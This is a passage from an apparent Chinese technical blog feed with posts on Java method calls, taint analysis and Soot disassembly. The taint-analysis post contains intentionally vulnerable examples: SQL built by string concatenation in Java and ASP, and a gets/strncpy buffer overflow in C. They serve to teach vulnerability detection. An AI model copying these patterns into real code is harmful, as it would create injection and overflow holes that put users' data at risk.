<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Son</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Son</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showStatic</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Son staitc method."</span>+str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">showPrivate</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Son private method"</span>+str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        showStatic(<span class="string">"niceday"</span>);</span><br><span class="line">        Father.showStatic(<span class="string">"good"</span>);</span><br><span class="line">        showPrivate(<span class="string">"hello"</span>);</span><br><span class="line">        <span class="keyword">super</span>.showCommon();</span><br><span class="line">        <span class="keyword">super</span>.showFinal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Son son = <span class="keyword">new</span> Son();</span><br><span class="line">        son.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ol>
<li>重点还是各种方法的调用。</li>
<li>第一个<code>showStatic(&quot;niceday&quot;)</code>是Son子类自己的static方法。</li>
<li>第二个<code>Father.showStatic(&quot;good&quot;)</code>，是父类的static方法。</li>
<li>第三个<code>showPrivate(&quot;hello&quot;)</code>，是子类自己的private方法。</li>
<li>第四个和第五个方法都是继承父类的方法，分别是父类的正常方法和父类的final方法。</li>
</ol>
<p>下面看一下字节码，对应关系如下：</p>
<p><img src="../images/Java%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8/image-20200802181946768.png" alt="image-20200802181946768"></p>
<p><img src="../images/Java%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8/image-20200802182209486.png" alt="image-20200802182209486"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>污点分析简单介绍</title>
    <url>/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>明月几时有，把酒问青天。</p>
</blockquote>
<p>今天来总结污点分析，写点笔记。</p>
<a id="more"></a>

<h1 id="污点分析"><a href="#污点分析" class="headerlink" title="污点分析"></a>污点分析</h1><h2 id="基本原理-amp-lt-sources-sinks-sanitizers-gt"><a href="#基本原理-amp-lt-sources-sinks-sanitizers-gt" class="headerlink" title="基本原理 &amp; &lt;sources,sinks,sanitizers&gt;"></a>基本原理 &amp; &lt;sources,sinks,sanitizers&gt;</h2><p>污点分析是一种跟踪并分析污点信息在程序中流动的技术。</p>
<p>在漏洞分析中，使用污点分析技术将所感兴趣的数据（通常来自程序的外部输入）标记为<strong>污点数据</strong>，然后通过跟踪和污点数据相关的信息的流向，可以知道它们是否会影响某些关键的程序操作，进而挖掘程序漏洞。</p>
<p>即将程序是否存在某种漏洞的问题转化为污点信息是否会被 Sink 点上的操作所使用的问题。</p>
<p>污点分析常常包括以下几个部分：</p>
<ul>
<li>识别污点信息在程序中的产生点（Source点）并对污点信息进行标记</li>
<li>利用特定的规则跟踪分析污点信息在程序中的传播过程</li>
<li>在一些关键的程序点（Sink点）检测关键的操作是否会受到污点信息的影响</li>
</ul>
<p>污点分析可以抽象成一个三元组<code>&lt;sources,sinks,sanitizers&gt;</code>的形式，其中，source 即污点源，代表直接引入不受信任的数据或者机密数据到系统中；</p>
<p>sink即污点汇聚点,代表直接产生安全敏感操作(违反数据完整性)或者泄露隐私数据到外界(违反数据保密性)；</p>
<p>sanitizer即无害处理，代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害。</p>
<p><strong>污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理,而直接传播到污点汇聚点。如果不能，说明系统是信息流安全的；否则，说明系统产生了隐私数据泄露或危险数据操作等安全问题。</strong></p>
<p><img src="../images/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/image-20200720214151867.png" alt="image-20200720214151867"></p>
<p>举个例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[...]</span><br><span class="line">scanf(&quot;%d&quot;, &amp;x);    // Source 点，输入数据被标记为污点信息，并且认为变量 x 是污染的</span><br><span class="line">[...]</span><br><span class="line">y = x + k;          // 如果二元操作的操作数是污染的，那么操作结果也是污染的，所以变量 y 也是污染的</span><br><span class="line">[...]</span><br><span class="line">x = 0;              // 如果一个被污染的变量被赋值为一个常数，那么认为它是未污染的，所以 x 转变成未污染的</span><br><span class="line">[...]</span><br><span class="line">while (i &lt; y)       // Sink 点，如果规定循环的次数不能受程序输入的影响，那么需要检查 y 是否被污染</span><br></pre></td></tr></table></figure>

<p>然而污点信息不仅可以通过数据依赖传播，还可以通过控制依赖传播。我们将通过数据依赖传播的信息流称为显式信息流，将通过控制依赖传播的信息流称为隐式信息流。</p>
<p>举个例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (x &gt; 0)</span><br><span class="line">    y = 1;</span><br><span class="line">else</span><br><span class="line">    y = 0;</span><br></pre></td></tr></table></figure>

<p>变量 y 的取值依赖于变量 x 的取值，如果变量 x 是污染的，那么变量 y 也应该是污染的。</p>
<p>通常我们将使用污点分析可以检测的程序漏洞称为污点类型的漏洞，例如 SQL 注入漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String user = getUser();</span><br><span class="line">String pass = getPass();</span><br><span class="line">String sqlQuery = &quot;select * from login where user=&apos;&quot; + user + &quot;&apos; and pass=&apos;&quot; + pass + &quot;&apos;&quot;;</span><br><span class="line">Statement stam = con.createStatement();</span><br><span class="line">ResultSetrs = stam.executeQuery(sqlQuery);</span><br><span class="line">if (rs.next())</span><br><span class="line">    success = true;</span><br></pre></td></tr></table></figure>

<p>在进行污点分析时，将变量 user 和 pass 标记为污染的，由于变量 sqlQuery 的值受到 user 和 pass 的影响，所以将 sqlQuery 也标记为污染的。程序将变量 sqlQuery 作为参数构造 SQL 操作语句，于是可以判定程序存在 SQL 注入漏洞。</p>
<p>所以主要分为两种：</p>
<ul>
<li>基于数据流的污点分析。在不考虑隐式信息流的情况下，可以将污点分析看做针对污点数据的数据流分析。根据污点传播规则跟踪污点信息或者标记路径上的变量污染情况，进而检查污点信息是否影响敏感操作。</li>
<li>基于依赖关系的污点分析。考虑隐式信息流，在分析过程中，根据程序中的语句或者指令之间的依赖关系，检查 Sink 点处敏感操作是否依赖于 Source 点处接收污点信息的操作。</li>
</ul>
<p><strong>现有的识别污点源和汇聚点的方法可以大致分成 3 类:</strong></p>
<ol>
<li>使用启发式的策略进行标记,例如把来自程序外部输入的数据统称为“污点”数据,保守地认为这些数据有可能包含恶意的攻击数据(如 PHP Aspis)；</li>
<li>根据具体应用程序调用的 API 或者重要的数据类型,手工标记源和汇聚点(如 DroidSafe，Soot)；</li>
<li>使用统计或机器学习技术自动地识别和标记污点源及汇聚点。</li>
</ol>
<h2 id="方法实现"><a href="#方法实现" class="headerlink" title="方法实现"></a>方法实现</h2><p>静态污点分析系统首先对程序代码进行解析，获得程序代码的<strong>中间表示</strong>，然后在中间表示的基础上对程序代码进行控制流分析等辅助分析，以获得需要的控制流图、调用图等。</p>
<p>在辅助分析的过程中，系统可以利用污点分析规则在中间表示上识别程序中的 Source 点和 Sink 点。</p>
<p>最后检测系统根据污点分析规则，利用静态污点分析检查程序是否存在污点类型的漏洞。</p>
<h2 id="基于数据流的污点分析"><a href="#基于数据流的污点分析" class="headerlink" title="基于数据流的污点分析"></a>基于数据流的污点分析</h2><p>在基于数据流的污点分析中，常常需要一些辅助分析技术，例如别名分析、取值分析等，来提高分析精度。辅助分析和污点分析交替进行，通常沿着程序路径的方向分析污点信息的流向，检查 Source 点处程序接收的污点信息是否会影响到 Sink 点处的敏感操作。</p>
<p><strong>过程内intra的分析</strong>中，按照一定的顺序分析过程内的每一条语句或者指令，进而分析污点信息的流向。</p>
<ul>
<li>记录污点信息。在静态分析层面，程序变量的污染情况为主要关注对象。为记录污染信息，通常为变量添加一个污染标签。<em>最简单的就是一个布尔型变量，表示变量是否被污染。更复杂的标签还可以记录变量的污染信息来自哪些 Source 点，甚至精确到 Source 点接收数据的哪一部分。</em>当然也可以不使用污染标签，这时我们通过对变量进行跟踪的方式达到分析污点信息流向的目的。<strong>例如使用栈或者队列来记录被污染的变量。</strong></li>
<li>程序语句的分析。在确定如何记录污染信息后，将对程序语句进行静态分析。通常我们主要关注赋值语句、控制转移语句以及过程调用语句三类。<ul>
<li>赋值语句。<ul>
<li>对于简单的赋值语句，形如 <code>a = b</code> 这样的，记录语句左端的变量和右端的变量具有相同的污染状态。<strong>程序中的常量通常认为是未污染的</strong>，如果一个变量被赋值为常量，在不考虑隐式信息流的情况下，认为变量的状态在赋值后是未污染的。</li>
<li>对于形如 <code>a = b + c</code> 这样带有二元操作的赋值语句，通常规定如果右端的操作数只要有一个是被污染的，则左端的变量是污染的（除非右端计算结果为常量）。</li>
<li>对于和数组元素相关的赋值，如果可以通过静态分析确定数组下标的取值或者取值范围，那么就可以精确地判断数组中哪个或哪些元素是污染的。<strong>但通常静态分析不能确定一个变量是污染的，那么就简单地认为整个数组都是污染的。</strong></li>
<li>对于包含字段或者包含指针操作的赋值语句，常常需要用到指向分析的分析结果。</li>
</ul>
</li>
<li>控制转移语句。<ul>
<li>在分析条件控制转移语句时，首先考虑语句中的路径条件可能是包含对污点数据的限制，在实际分析中常常需要识别这种限制污点数据的条件，以判断这些限制条件是否足够包含程序不会受到攻击。如果得出路径条件的限制是足够的，那么可以将相应的变量标记为未污染的。</li>
<li>对于循环语句，通常规定循环变量的取值范围不能受到输入的影响。例如在语句 <code>for (i = 1; i &lt; k; i++){}</code> 中，可以规定循环的上界 k 不能是污染的。</li>
</ul>
</li>
<li>过程调用语句。<ul>
<li>可以使用过程间的分析或者直接应用过程摘要进行分析。污点分析所使用的过程摘要主要描述怎样改变与该过程相关的变量的污染状态，以及对哪些变量的污染状态进行检测。这些变量可以是过程使用的参数、参数的字段或者过程的返回值等。例如在语句 <code>flag = obj.method(str);</code> 中，str 是污染的，那么通过过程间的分析，将变量 obj 的字段 str 标记为污染的，而记录方法的返回值的变量 flag 标记为未污染的。</li>
<li>在实际的过程间分析中，可以对已经分析过的过程构建过程摘要。例如前面的语句，其过程摘要描述为：方法 method 的参数污染状态决定其接收对象的实例域 str 的污染状态，并且它的返回值是未受污染的。那么下一次分析需要时，就可以直接应用摘要进行分析。</li>
</ul>
</li>
</ul>
</li>
<li>代码的遍历。一般情况下，常常使用流敏感的方式或者路径敏感的方式进行遍历，并分析过程中的代码。如果使用流敏感的方式，可以通过对不同路径上的分析结果进行汇集，以发现程序中的数据净化规则。如果使用路径敏感的分析方式，则需要关注路径条件，如果路径条件中涉及对污染变量取值的限制，可认为路径条件对污染数据进行了净化，还可以将分析路径条件对污染数据的限制进行记录，如果在一条程序路径上，这些限制足够保证数据不会被攻击者利用，就可以将相应的变量标记为未污染的。</li>
</ul>
<p><strong>过程间的分析</strong>与数据流过程间分析类似，使用<strong>自底向上</strong>的分析方法，分析调用图中的每一个过程，进而对程序进行整体的分析。</p>
<h2 id="基于依赖关系的污点分析"><a href="#基于依赖关系的污点分析" class="headerlink" title="基于依赖关系的污点分析"></a>基于依赖关系的污点分析</h2><p>在基于依赖关系的污点分析中，<strong>首先利用程序的中间表示、控制流图和过程调用图构造程序完整的或者局部的程序的依赖关系</strong>。在分析程序依赖关系后，根据污点分析规则，检测 Sink 点处敏感操作是否依赖于 Source 点。</p>
<p><strong>分析程序依赖关系的过程可以看做是构建程序依赖图的过程</strong>。程序依赖图是一个有向图。它的节点是程序语句，它的有向边表示程序语句之间的依赖关系。程序依赖图的有向边常常包括数据依赖边和控制依赖边。在构建有一定规模的程序的依赖图时，需要按需地构建程序依赖关系，并且优先考虑和污点信息相关的程序代码。</p>
<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p>在使用污点分析方法检测程序漏洞时，污点数据相关的程序漏洞是主要关注对象，如 SQL 注入漏洞、命令注入漏洞和跨站脚本漏洞等。</p>
<p>下面是一个存在 SQL 注入漏洞 ASP 程序的例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    Set pwd = &quot;bar&quot;</span><br><span class="line">    Set sql1 = &quot;SELECT companyname FROM &quot; &amp; Request.Cookies(&quot;hello&quot;)</span><br><span class="line">    Set sql2 = Request.QueryString(&quot;foo&quot;)</span><br><span class="line">    MySqlStuff pwd, sql1, sql2</span><br><span class="line">    Sub MySqlStuff(password, cmd1, cmd2)</span><br><span class="line">    Set conn = Server.CreateObject(&quot;ADODB.Connection&quot;)</span><br><span class="line">    conn.Provider = &quot;Microsoft.Jet.OLEDB.4.0&quot;</span><br><span class="line">    conn.Open &quot;c:/webdata/foo.mdb&quot;, &quot;foo&quot;, password</span><br><span class="line">    Set rs = conn.Execute(cmd2)</span><br><span class="line">    Set rs = Server.CreateObject(&quot;ADODB.recordset&quot;)</span><br><span class="line">    rs.Open cmd1, conn</span><br><span class="line">    End Sub</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>首先对这段代码表示为一种三地址码的形式，例如第 3 行可以表示为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = &quot;SELECT companyname FROM &quot;</span><br><span class="line">b = &quot;hello&quot;</span><br><span class="line">param0 Request</span><br><span class="line">param1 b</span><br><span class="line">callCookies</span><br><span class="line">return c</span><br><span class="line">sql1 = a &amp; c</span><br></pre></td></tr></table></figure>

<p>解析完毕后，需要对程序代码进行控制流分析，这里只包含了一个调用关系（第 5 行）。</p>
<p>接下来，需要识别程序中的 Source 点和 Sink 点以及初始的被污染的数据。</p>
<p>具体的分析过程如下：</p>
<ul>
<li>调用 Request.Cookies(“hello”) 的返回结果是污染的，所以变量 sql1 也是污染的。</li>
<li>调用 Request.QueryString(“foo”) 的返回结果 sql2 是污染的。</li>
<li>函数 MySqlStuff 被调用，它的参数 sql1，sql2 都是污染的。分了分析函数的处理过程，根据第 6 行函数的声明，标记其参数 cmd1，cmd2 是污染的。</li>
<li>第 10 行是程序的 Sink 点，函数 conn.Execute 执行 SQL 操作，其参数 cmd2 是污染的，进而发现污染数据从 Source 点传播到 Sink 点。因此，认为程序存在 SQL 注入漏洞</li>
</ul>
<h1 id="动态污点分析"><a href="#动态污点分析" class="headerlink" title="动态污点分析"></a>动态污点分析</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>动态污点分析是在程序运行的基础上，对数据流或控制流进行监控，从而实现对数据在内存中的显式传播、数据误用等进行跟踪和检测。动态污点分析与静态污点分析的唯一区别在于<strong>静态污点分析技术在检测时并不真正运行程序，而是通过模拟程序的执行过程来传播污点标记，而动态污点分析技术需要运行程序，同时实时传播并检测污点标记。</strong></p>
<p>动态污点分析技术可分为三个部分：</p>
<ul>
<li>污点数据标记：程序攻击面是程序接受输入数据的接口集，一般由程序入口点和外部函数调用组成。在污点分析中，来自外部的输入数据会被标记为污点数据。根据输入数据来源的不同，可分为三类：网络输入、文件输入和输入设备输入。</li>
<li>污点动态跟踪：在污点数据标记的基础上，对进程进行指令粒度的动态跟踪分析，分析每一条指令的效果，直至覆盖整个程序的运行过程，跟踪数据流的传播。<ul>
<li>动态污点跟踪通常基于以下三种机制<ul>
<li>动态代码插桩：可以跟踪单个进程的污点数据流动，通过在被分析程序中插入分析代码，跟踪污点信息流在进程中的流动方向。</li>
<li>全系统模拟：利用全系统模拟技术，分析模拟系统中每条指令的污点信息扩散路径，可以跟踪污点数据在操作系统内的流动。</li>
<li>虚拟机监视器：通过在虚拟机监视器中增加分析污点信息流的功能，跟踪污点数据在整个客户机中各个虚拟机之间的流动。</li>
</ul>
</li>
<li>污点动态跟踪通常需要影子内存（shadow memory）来映射实际内存的污染情况，从而记录内存区域和寄存器是否是被污染的。对每条语句进行分析的过程中，污点跟踪攻击根据影子内存判断是否存在污点信息的传播，从而对污点信息进行传播并将传播结果保存于影子内存中，进而追踪污点数据的流向。</li>
<li>一般情况下，数据移动类和算数类指令都将造成显示的信息流传播。为了跟踪污点数据的显示传播，需要在每个数据移动指令和算数指令执行前做监控，<strong>当指令的结果被其中一个操作数污染后，把结果数据对应的影子内存设置为一个指针，指向源污染点操作数指向的数据结构。</strong></li>
</ul>
</li>
<li>污点误用检查：在正确标记污点数据并对污点数据的传播进行实时跟踪后，就需要对攻击做出正确的检测即检测污点数据是否有非法使用的情况。</li>
</ul>
<p>动态污点分析的优缺点：</p>
<ul>
<li>优点：误报率较低，检测结果的可信度较高。</li>
<li>缺点：<ul>
<li>漏报率较高：由于程序动态运行时的代码覆盖率决定的。</li>
<li>平台相关性较高：特定的动态污点分析工具只能够解决在特定平台上运行的程序。</li>
<li>资源消耗大：包括空间上和时间上。</li>
</ul>
</li>
</ul>
<h2 id="方法实现-1"><a href="#方法实现-1" class="headerlink" title="方法实现"></a>方法实现</h2><h3 id="污点数据标记"><a href="#污点数据标记" class="headerlink" title="污点数据标记"></a>污点数据标记</h3><p>污点数据通常主要是指软件系统所接受的外部输入数据，在计算机中，这些数据可能以内存临时数据的形式存储，也可能以文件的形式存储。当程序需要使用这些数据时，一般通过函数或系统调用来进行数据访问和处理，因此只需要对这些关键函数进行监控，即可得到程序读取或输出了什么污点信息。另外对于网络输入，也需要对网络操作函数进行监控。</p>
<p>识别出污点数据后，需要对污点进行标记。污点生命周期是指在该生命周期的时间范围内，污点被定义为有效。污点生命周期开始于污点创建时刻，生成污点标记，结束于污点删除时刻，清除污点标记。</p>
<ul>
<li>污点创建<ul>
<li>将来自于非可靠来源的数据分配给某寄存器或内存操作数时</li>
<li>将已经标记为污点的数据通过运算分配给某寄存器或内存操作数时</li>
</ul>
</li>
<li>污点删除<ul>
<li>将非污点数据指派给存放污点的寄存器或内存操作数时</li>
<li>将污点数据指派给存放污点的寄存器或内存地址时，此时会删除原污点，并创建新污点</li>
<li>一些会清除污点痕迹的算数运算或逻辑运算操作时</li>
</ul>
</li>
</ul>
<h3 id="污点动态跟踪"><a href="#污点动态跟踪" class="headerlink" title="污点动态跟踪"></a>污点动态跟踪</h3><p>当污点数据从一个位置传递到另一个位置时，则认为产生了污点传播。污点传播规则：</p>
<table>
<thead>
<tr>
<th>指令类型</th>
<th>传播规则</th>
<th>举例说明</th>
</tr>
</thead>
<tbody><tr>
<td>拷贝或移动指令</td>
<td>T(a)&lt;-T(b)</td>
<td>mov a, b</td>
</tr>
<tr>
<td>算数运算指令</td>
<td>T(a)&lt;-T(b)</td>
<td>add a, b</td>
</tr>
<tr>
<td>堆栈操作指令</td>
<td>T(esp)&lt;-T(a)</td>
<td>push a</td>
</tr>
<tr>
<td>拷贝或移动类函数调用指令</td>
<td>T(dst)&lt;-T(src)</td>
<td>call memcpy</td>
</tr>
<tr>
<td>清零指令</td>
<td>T(a)&lt;-false</td>
<td>xor a, a</td>
</tr>
</tbody></table>
<p>注：T(x) 的取值分为 true 和 false 两种，取值为 true 时表示 x 为污点，否则 x 不是污点。</p>
<p>对于污点信息流，通过污点跟踪和函数监控，已经能够进行污点信息流流动方向的分析。但由于缺少对象级的信息，仅靠指令级的信息流动并不能完全给出要分析的软件的确切行为。因此，需要在函数监控的基础上进行视图重建，如获取文件对象和套接字对象的详细信息，以方便进一步的分析工作。</p>
<p>根据漏洞分析的实际需求，污点分析应包括两方面的信息：</p>
<ul>
<li>污点的传播关系，对于任一污点能够获知其传播情况。</li>
<li>对污点数据进行处理的所有指令信息，包括指令地址、操作码、操作数以及在污点处理过程中这些指令执行的先后顺序等。</li>
</ul>
<p>污点动态跟踪的实现通常使用：</p>
<ul>
<li>影子内存：真实内存中污点数据的镜像，用于存放程序执行的当前时刻所有的有效污点。</li>
<li>污点传播树：用于表示污点的传播关系。</li>
<li>污点处理指令链：用于按时间顺序存储与污点数据处理相关的所有指令。</li>
</ul>
<p>当遇到会引起污点传播的指令时，首先对指令中的每个操作数都通过污点快速映射查找影子内存中是否存在与之对应的影子污点从而确定其是否为污点数据，然后根据污点传播规则得到该指令引起的污点传播结果，并将传播产生的新污点添加到影子内存和污点传播树中，同时将失效污点对应的影子污点删除。同时由于一条指令是否涉及污点数据的处理，需要在污点分析过程中动态确定，因此需要在污点处理指令链中记录污点数据的指令信息。</p>
<h3 id="污点误用检查"><a href="#污点误用检查" class="headerlink" title="污点误用检查"></a>污点误用检查</h3><p>污点敏感点，即 Sink 点，是污点数据有可能被误用的指令或系统调用点，主要分为：</p>
<ul>
<li>跳转地址：检查污点数据是否用于跳转对象，如返回地址、函数指针、函数指针偏移等。具体操作是在每个跳转类指令（如call、ret、jmp等）执行前进行监控分析，保证跳转对象不是污点数据所在的内存地址。</li>
<li>格式化字符串：检查污点数据是否用作printf系列函数的格式化字符串参数。</li>
<li>系统调用参数：检查特殊系统调用的特殊参数是否为污点数据。</li>
<li>标志位：跟踪标志位是否被感染，及被感染的标志位是否用于改变程序控制流。</li>
<li>地址：检查数据移动类指令的地址是否被感染。</li>
</ul>
<p>在进行污点误用检查时，通常需要根据一些漏洞模式来进行检查，首先需要明确常见漏洞在二进制代码上的表现形式，然后将其提炼成漏洞模式，以更有效地指导自动化的安全分析。</p>
<h2 id="动态污点分析的实例分析"><a href="#动态污点分析的实例分析" class="headerlink" title="动态污点分析的实例分析"></a>动态污点分析的实例分析</h2><p>下面我们来看一个使用动态污点分析的方法检测缓冲区溢出漏洞的例子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void fun(char *str)</span><br><span class="line">&#123;</span><br><span class="line">    char temp[15];</span><br><span class="line">    printf(&quot;in strncpy, source: %s\n&quot;, str);</span><br><span class="line">    strncpy(temp, str, strlen(str));        // Sink 点</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    char source[30];</span><br><span class="line">    gets(source);                           // Source 点</span><br><span class="line">    if (strlen(source) &lt; 30)</span><br><span class="line">        fun(source);</span><br><span class="line">    else</span><br><span class="line">        printf(&quot;too long string, %s\n&quot;, source);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞很明显， 调用 strncpy 函数存在缓冲区溢出。</p>
<p>程序接受外部输入字符串的二进制代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x08048609 &lt;+51&gt;:    lea    eax,[ebp-0x2a]</span><br><span class="line">0x0804860c &lt;+54&gt;:    push   eax</span><br><span class="line">0x0804860d &lt;+55&gt;:    call   0x8048400 &lt;gets@plt&gt;</span><br><span class="line">...</span><br><span class="line">0x0804862c &lt;+86&gt;:    lea    eax,[ebp-0x2a]</span><br><span class="line">0x0804862f &lt;+89&gt;:    push   eax</span><br><span class="line">0x08048630 &lt;+90&gt;:    call   0x8048566 &lt;fun&gt;</span><br></pre></td></tr></table></figure>

<p>程序调用 strncpy 函数的二进制代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x080485a1 &lt;+59&gt;:    push   DWORD PTR [ebp-0x2c]</span><br><span class="line">0x080485a4 &lt;+62&gt;:    call   0x8048420 &lt;strlen@plt&gt;</span><br><span class="line">0x080485a9 &lt;+67&gt;:    add    esp,0x10</span><br><span class="line">0x080485ac &lt;+70&gt;:    sub    esp,0x4</span><br><span class="line">0x080485af &lt;+73&gt;:    push   eax</span><br><span class="line">0x080485b0 &lt;+74&gt;:    push   DWORD PTR [ebp-0x2c]</span><br><span class="line">0x080485b3 &lt;+77&gt;:    lea    eax,[ebp-0x1b]</span><br><span class="line">0x080485b6 &lt;+80&gt;:    push   eax</span><br><span class="line">0x080485b7 &lt;+81&gt;:    call   0x8048440 &lt;strncpy@plt&gt;</span><br></pre></td></tr></table></figure>

<p>首先，在扫描该程序的二进制代码时，能够扫描到 <code>call</code>，该函数会读入外部输入，即程序的攻击面。确定了攻击面后，我们将分析污染源数据并进行标记，即将 <code>[ebp-0x2a]</code> 数组（即源程序中的source）标记为污点数据。程序继续执行，该污染标记会随着该值的传播而一直传递。在进入 <code>fun()</code> 函数时，该污染标记通过形参实参的映射传递到参数 <code>str</code> 上。然后运行到 Sink 点函数 <code>strncpy()</code>。该函数的第二个参数即 <code>str</code> 和 第三个参数 <code>strlen(str)</code> 都是污点数据。最后在执行 <code>strncpy()</code> 函数时，若设定了相应的漏洞规则（目标数组小于源数组），则漏洞规则将被触发，检测出缓冲区溢出漏洞。</p>
<p>参考：</p>
<p><a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/5.5_taint_analysis.md" target="_blank" rel="noopener">1</a></p>
<p><a href="[https://www.k0rz3n.com/2019/03/01/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/](https://www.k0rz3n.com/2019/03/01/简单理解污点分析技术/)">2</a></p>
]]></content>
      <categories>
        <category>污点分析</category>
      </categories>
      <tags>
        <tag>污点分析基础</tag>
      </tags>
  </entry>
  <entry>
    <title>[soot]如何反编译类文件</title>
    <url>/soot-%E5%A6%82%E4%BD%95%E5%8F%8D%E7%BC%96%E8%AF%91%E7%B1%BB%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>江山留胜迹，我辈复登临。</p>
</blockquote>
<p>今天继续跟Soot，来看如何反汇编class文件。</p>
<a id="more"></a>

<h1 id="Soot基本用途"><a href="#Soot基本用途" class="headerlink" title="Soot基本用途"></a>Soot基本用途</h1><p>Soot有两个基本用途：它可以用作独立的命令行工具或Java编译器框架。</p>
<p>作为命令行工具，Soot可以：</p>
<ul>
<li>反汇编类文件</li>
<li>汇编类文件</li>
<li>优化类文件</li>
</ul>
<p>作为Java编译器框架，Soot可用作开发新优化的测试平台。然后，可以将这些新的优化添加到Soot命令行工具调用的优化基础集。添加的优化部分可以应用于单个类文件，也可以应用于整个应用程序。</p>
<p>Soot通过能够以各种不同形式处理类文件来完成这些无数的任务。目前，Soot接受来自以下来源的代码，并输出其任何中间表示：</p>
<ul>
<li>Java（字节码和Java 7之前的源代码），包括编译成Java字节码的其他语言，例如Scala</li>
<li>Android字节码</li>
<li>简单的中间表示</li>
<li>Jasmin，低级别的中间表示。</li>
</ul>
<p>通过使用-help选项调用Soot，可以看到输出格式：</p>
<p><img src="../images/soot-%E5%A6%82%E4%BD%95%E5%8F%8D%E7%BC%96%E8%AF%91%E7%B1%BB%E6%96%87%E4%BB%B6/image-20200719155822000.png" alt="image-20200719155822000"></p>
<p>Soot中目前使用六个中间表示形式：baf，jimple，shimple，grimp，jasmin和classfile。每种形式的简要说明如下：</p>
<ul>
<li><code>baf</code> 字节码的简化表示形式。用于检查Java字节码作为堆栈代码，但格式更好。有两种文本表示形式（一种缩写（.b文件），一种完整（.baf文件）。）</li>
<li><code>jimple</code> 键入3地址代码。用于执行优化和检查字节码的非常方便的表示形式。有两个文本表示形式（.jimp文件和.jimple文件。）</li>
<li><code>shimple</code> Jimple的SSA变体。有两个文本表示形式（.shimp文件和.shimple文件。）</li>
<li><code>grimp</code> 聚集的（相对于表达式树）jimple。检查反汇编代码的最佳中间表示。有两个文本表示形式（.grimp文件和.grimple文件。）</li>
<li><code>jasmin</code> 凌乱的汇编器格式。主要用于调试Soot。Jasmin文件以“ .jasmin”结尾。</li>
<li><code>classfiles</code> 原始Java字节码格式。二进制（非文本）表示形式。通常的.class文件。</li>
</ul>
<h1 id="生成一个Jimple文件"><a href="#生成一个Jimple文件" class="headerlink" title="生成一个Jimple文件"></a>生成一个Jimple文件</h1><p>先实现一个简单的Jimple类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello world!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需编译该类（使用javac或其他编译器），然后在Hello.class所在的目录中尝试以下命令。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java soot.Main -cp CLASSPATH -f jimple Hello</span><br></pre></td></tr></table></figure>

